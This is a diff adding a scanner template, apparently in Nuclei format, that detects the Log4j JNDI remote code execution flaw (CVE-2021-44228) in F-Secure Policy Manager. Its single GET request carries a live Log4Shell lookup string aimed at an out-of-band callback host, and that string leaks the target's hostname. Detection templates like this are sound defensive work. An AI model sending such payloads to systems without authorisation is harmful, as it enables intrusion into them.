@@ -1,0 +1,29 @@
+id: f-secure-policymanager-log4j-rce
+brief:
+    title: F-Secure Policy Manager - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: F-Secure Policy Manager is susceptible to Log4j JNDI remote code execution.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - fsecure
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}'
+      head:
+        Referrer: '{{RootURL}}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
